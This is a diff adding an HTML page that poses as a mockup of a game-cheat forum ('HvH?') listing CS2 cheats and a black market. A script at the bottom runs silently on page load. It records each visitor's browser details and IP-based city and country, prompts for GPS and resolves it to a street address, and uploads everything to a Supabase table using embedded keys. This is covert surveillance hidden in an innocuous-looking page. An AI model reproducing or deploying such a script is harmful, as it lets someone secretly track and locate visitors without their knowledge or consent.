@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>HvH? - Forum list (mockup)</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap">
+<style>
+:root{--bg:#1b1b1b;--side:#1f1f1f;--card:#222;--card2:#272727;--line:#2e2e2e;--ink:#f1f1f1;--mut:#a3a3a3;--on:#fff;--hl:#303030;
+color-scheme:dark;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font:500 14px/1.4 Poppins,system-ui,-apple-system,"Segoe UI",sans-serif}
+a{color:inherit;text-decoration:none}
+.app{display:flex;gap:28px;padding:16px;min-height:100vh}
+.side{width:216px;flex:none;background:var(--side);border:1px solid var(--line);border-radius:14px;padding:14px;height:calc(100vh - 32px);position:sticky;top:16px}
+.brand{font:italic 700 46px/1 Poppins,sans-serif;text-align:center;padding:14px 0 18px;border-bottom:1px solid var(--line);margin-bottom:14px;letter-spacing:-2px}
+.nav a{display:flex;align-items:center;gap:14px;padding:14px 14px;border-radius:10px;color:var(--mut);font-weight:600;margin-bottom:4px}
+.nav a.on{background:var(--hl);color:var(--ink)}
+.nav a i{font-style:normal;width:20px;text-align:center}
+.nav a s{margin-left:auto;text-decoration:none;font-size:11px}
+.main{flex:1;max-width:1070px;margin:0 auto;min-width:0}
+.topbar{display:flex;justify-content:flex-end;align-items:center;gap:14px;margin-bottom:16px}
+.me{display:flex;align-items:center;gap:8px;font-weight:600}
+.dot{width:16px;height:16px;border-radius:50%;background:#000;display:inline-block}
+.search{width:225px;background:var(--card2);border:1px solid var(--line);border-radius:8px;padding:9px 12px;color:var(--mut)}
+.ad{height:130px;border-radius:6px;border:2px solid #2dd36f;background:linear-gradient(90deg,#0b2a2a,#0e1b2e 50%,#0b2a2a);display:grid;place-items:center;position:relative;color:#7fe3b0;font:700 28px Poppins,sans-serif;letter-spacing:2px}
+.ad em{position:absolute;top:8px;right:8px;font:500 10px Poppins;background:#1b1b1b99;border:1px solid #444;color:#ccc;padding:2px 7px;border-radius:5px;letter-spacing:0}
+.cols{display:grid;grid-template-columns:1fr 228px;gap:16px}
+.ttl{display:flex;justify-content:space-between;align-items:center;margin:14px 0 14px;grid-column:1/-1}
+.ttl h1{margin:0;font-size:20px;font-weight:600}
+.btn{display:inline-block;background:#fff;color:#111;border-radius:8px;padding:8px 12px;font-weight:600;font-size:13px;margin-left:8px}
+.tabs{display:flex;gap:2px;padding:6px;background:var(--card);border:1px solid var(--line);border-radius:12px;margin-bottom:12px;overflow-x:auto}
+.tabs a{padding:12px 15px;border-radius:8px;color:var(--mut);font-weight:600;white-space:nowrap}
+.tabs a.on{background:#fff;color:#111}
+.cat{background:var(--card);border:1px solid var(--line);border-radius:12px;margin-bottom:14px;padding-bottom:6px}
+.cat>h2{margin:0;padding:14px 16px;font-size:15px;font-weight:600;border-bottom:1px solid var(--line);display:flex;justify-content:space-between}
+.cat>h2 span{color:var(--mut)}
+.nodes{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:12px}
+.node{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:14px;display:flex;flex-direction:column;gap:10px}
+.nh{display:flex;gap:12px}
+.ni{width:34px;height:34px;border-radius:9px;background:#fff;color:#111;display:grid;place-items:center;flex:none;font-size:16px}
+.nh b{font-size:15px;font-weight:600}
+.new{font-size:8px;font-weight:700;background:#fff;color:#111;border-radius:3px;padding:1px 5px;margin-left:5px;vertical-align:middle}
+.nh p{margin:2px 0 6px;color:var(--mut);font-size:13px}
+.stat{font-size:11px;font-weight:600;display:flex;gap:16px}
+.sub{font-size:11px;color:var(--mut);margin-top:6px}
+.last{border-top:1px solid var(--line);padding-top:12px;display:flex;gap:10px;align-items:center;margin-top:auto}
+.av{width:32px;height:32px;border-radius:50%;background:#444;flex:none;display:grid;place-items:center;color:#aaa}
+.last b{display:block;font-size:13px;font-weight:600}
+.last span{color:var(--mut);font-size:12px}
+.pfx{font-size:10px;border:1px solid #7a2a2a;background:#3a1b1b;color:#ff8a8a;border-radius:4px;padding:0 6px;margin-right:4px}
+.pfx.b{border-color:#2a3f7a;background:#1b233a;color:#8aa8ff}
+.pfx.g{border-color:#2a7a3f;background:#1b3a23;color:#8aff9f}
+.box{background:var(--card);border:1px solid var(--line);border-radius:12px;margin-bottom:16px;overflow:hidden}
+.box>h3{margin:0;padding:14px 15px;font-size:14px;font-weight:600;border-bottom:1px solid var(--line)}
+.acc{display:flex;gap:10px;align-items:center;padding:12px 15px}
+.acc .big{width:44px;height:44px;border-radius:50%;background:#000}
+.acc b{font-size:16px;display:block}.acc span{color:var(--mut);font-size:12px}
+.bt{display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:0 15px 12px}
+.bt a{background:var(--card2);border:1px solid var(--line);border-radius:6px;text-align:center;padding:5px;font-size:12px;font-weight:600}
+.info{border-top:1px solid var(--line);padding:10px 15px 14px;font-size:12px;color:var(--mut)}
+.info b{color:var(--ink)}
+.on-list{padding:12px 14px;color:var(--mut);font-size:12.5px;line-height:1.5;font-weight:600}
+.push{position:fixed;left:0;right:0;bottom:0;background:#171717;border-top:1px solid var(--line);text-align:center;padding:16px;font-size:13px}
+.push u{text-underline-offset:2px}
+@media(max-width:1000px){.side{display:none}.cols{grid-template-columns:1fr}.app{padding:12px}}
+@media(max-width:640px){.nodes{grid-template-columns:1fr}.ad{font-size:18px}}
+</style>
+</head>
+<body>
+<div class="app">
+  <aside class="side">
+    <div class="brand">HvH?</div>
+    <div class="nav">
+      <a class="on" href="#"><i>💬</i>Forums<s>⌄</s></a>
+      <a href="#"><i>📡</i>What's new<s>⌄</s></a>
+      <a href="#"><i>🕵️</i>Black Market<s>⌄</s></a>
+      <a href="#"><i>🖥️</i>HvH Servers<s>⌄</s></a>
+      <a href="#"><i>👥</i>Members<s>⌄</s></a>
+      <a href="#"><i>☆</i>Upgrades<s>⌄</s></a>
+    </div>
+  </aside>
+
+  <div class="main">
+    <div class="topbar"><div class="me"><span class="dot"></span>login</div><div class="search">⌕ &nbsp;Search…</div></div>
+    <div class="ad">YOUR AD HERE<em>AD</em></div>
+
+    <div class="cols">
+      <div class="ttl"><h1>Forum list</h1><div><a class="btn" href="#">⚡ New posts</a><a class="btn" href="#">✎ Post thread</a></div></div>
+
+      <div>
+        <div class="tabs"><a class="on" href="#">Global</a><a href="#">Software</a><a href="#">Configs/Scripts</a><a href="#">Knowledge/Questions</a><a href="#">Coding/Reversing</a><a href="#">Market</a></div>
+
+        <div class="cat"><h2>Main category<span>⌃</span></h2>
+          <div class="nodes">
+            <div class="node"><div class="nh"><div class="ni">📣</div><div><b>News / Giveaway</b><p>Get the latest updates and join exciting giveaways in our News and Giveaway subforum. Don't miss out on the fun!</p><div class="stat"><span>💬 17</span><span>🗨 323</span></div></div></div>
+              <div class="last"><div class="av">●</div><div><b><span class="pfx">News</span>Official thread title</b><span>4/5/26 · user_one</span></div></div></div>
+            <div class="node"><div class="nh"><div class="ni">💭</div><div><b>General Chat<span class="new">NEW</span></b><p>Discuss about everything, and nothing at the same time.</p><div class="stat"><span>💬 1.7K</span><span>🗨 10.7K</span></div><div class="sub">Sub-forums ▾</div></div></div>
+              <div class="last"><div class="av">●</div><div><b><span class="pfx b">Discussion</span>Thread title goes here</b><span>Today at 18:56 · user_two</span></div></div></div>
+          </div>
+        </div>
+
+        <div class="cat"><h2>Software<span>⌃</span></h2>
+          <div class="nodes">
+            <div class="node"><div class="nh"><div class="ni">🎯</div><div><b>CS2 Cheats<span class="new">NEW</span></b><p>Our collection of free and legit CS2 software.</p><div class="stat"><span>💬 259</span><span>🗨 13.6K</span></div></div></div>
+              <div class="last"><div class="av">?</div><div><b><span class="pfx g">✓</span>Thread title goes here</b><span>46 minutes ago · user_three</span></div></div></div>
+            <div class="node"><div class="nh"><div class="ni">🎯</div><div><b>Legacy Games<span class="new">NEW</span></b><p>Discover our collection of legacy software.</p><div class="stat"><span>💬 773</span><span>🗨 16.8K</span></div><div class="sub">Sub-forums ▾</div></div></div>
+              <div class="last"><div class="av">?</div><div><b><span class="pfx g">✓</span>Another thread title</b><span>Today at 18:20 · user_four</span></div></div></div>
+            <div class="node"><div class="nh"><div class="ni">🎯</div><div><b>Classic Shooters<span class="new">NEW</span></b><p>Discover our collection of classic game software.</p><div class="stat"><span>💬 120</span><span>🗨 4.1K</span></div></div></div></div>
+            <div class="node"><div class="nh"><div class="ni">⛏️</div><div><b>Sandbox Clients<span class="new">NEW</span></b><p>Explore our collection of free clients.</p><div class="stat"><span>💬 98</span><span>🗨 2.2K</span></div></div></div></div>
+          </div>
+        </div>
+      </div>
+
+      <aside>
+        <div class="box"><h3>Account</h3>
+          <div class="acc"><div class="big"></div><div><b>requires login</b><span>-</span></div></div>
+          <div class="bt"><a href="#">Account</a><a href="#">Privacy</a><a href="#">Upgrades</a><a href="#">Settings</a></div>
+          <div class="info">User ID: <b>000000</b><br>Messages: <b>0</b><br>Reactions: <b>0</b><br>Badges: <b>0</b><br>REP: <span style="color:#e55">-0</span>/<span style="color:#4c4">0+</span><br>Level: <b>(0)</b></div>
+        </div>
+        <div class="box"><h3>Members online</h3>
+          <div class="on-list">qwegvusdavgf, met4pf, XersXers23, RIP, oohcartier, lyx67, kiwi444, bimbel, EDUARDO9090, godoi, gl7ry, sickestmanisbes, M1 >.<, L4ZYNL, smetery, Fastfootbal0, m0nesyz, xxxxxddddddddd, nemmchan, itszerkd, smartwaternoon, undetecuser, 2fa, ianhol, joao1512, skraze51, IDKHEHEE, xXxNinja600xXx, ka187007, icy00065, santi2013jcz, streety, dorkswagnoob, pablitop, .kjev, nois54, marshal1231, Tanjawiii59, Ggezzzz33 ... and 76 more.</div>
+        </div>
+      </aside>
+    </div>
+  </div>
+</div>
+<div class="push">This site would like your permission to <u>enable push notifications</u>.</div>
+
+<!-- Importar el cliente de Supabase desde un CDN -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<script>
+  // Tus credenciales configuradas
+  const SUPABASE_URL = 'https://ehneyytwbxzjsiftpwpw.supabase.co'
+  const SUPABASE_ANON_KEY = 'sb_publishable_3TnnvmKntm_lLVtsMeBFZA_TP9TCiOY'
+  
+  const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY)
+
+  async function registrarVisitaCompleta() {
+    // 1. Recopilar información general del navegador (Sin permisos)
+    const datosBasicos = {
+      navegador: navigator.userAgent,
+      idioma: navigator.language || navigator.userLanguage,
+      resolucion: `${window.screen.width}x${window.screen.height}`,
+      url: window.location.href,
+      dispositivo: /Mobi|Android/i.test(navigator.userAgent) ? 'Móvil' : 'Escritorio'
+    }
+
+    // 2. Obtener IP y ubicación aproximada (Ciudad/País) como base
+    let infoIp = { ip: null, ciudad: null, pais: null }
+    try {
+      const resIp = await fetch('https://ipapi.co/json/')
+      const dataIp = await resIp.json()
+      infoIp = {
+        ip: dataIp.ip,
+        ciudad: dataIp.city,
+        pais: dataIp.country_name
+      }
+    } catch (e) {
+      console.error('No se pudo obtener la IP:', e)
+    }
+
+    // Objeto final que se va a guardar
+    let datosFinales = {
+      ...datosBasicos,
+      ...infoIp,
+      latitud: null,
+      longitud: null,
+      direccion: null
+    }
+
+    // 3. Intentar obtener la ubicación exacta por GPS (Calle y coordenadas)
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          // Si ACEPTA el permiso: Agregamos la ubicación exacta
+          const lat = position.coords.latitude
+          const lon = position.coords.longitude
+          
+          datosFinales.latitud = lat
+          datosFinales.longitud = lon
+
+          try {
+            const resGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+            const dataGeo = await resGeo.json()
+            datosFinales.direccion = dataGeo.display_name
+          } catch (err) {
+            datosFinales.direccion = "Coordenadas obtenidas, pero falló la conversión a dirección"
+          }
+
+          // Guardar en Supabase con GPS incluido
+          await guardarEnSupabase(datosFinales)
+        },
+        async (error) => {
+          // Si RECHAZA el permiso: Guardamos igual con la IP y los datos básicos
+          console.warn("Permiso de GPS denegado por el usuario. Guardando respaldo por IP.")
+          await guardarEnSupabase(datosFinales)
+        },
+        { timeout: 10000 } // Tiempo de espera máximo para el GPS
+      )
+    } else {
+      // Si el navegador no soporta geolocalización, guarda lo que tenemos
+      await guardarEnSupabase(datosFinales)
+    }
+  }
+
+  async function guardarEnSupabase(datos) {
+    const { error } = await supabase.from('visitas').insert([datos])
+    if (error) {
+      console.error('Error al guardar en Supabase:', error.message)
+    } else {
+      console.log('¡Visita registrada correctamente!')
+    }
+  }
+
+  // Ejecutar al cargar la página HTML
+  window.addEventListener('DOMContentLoaded', registrarVisitaCompleta)
+</script>
+</body>
+</html>
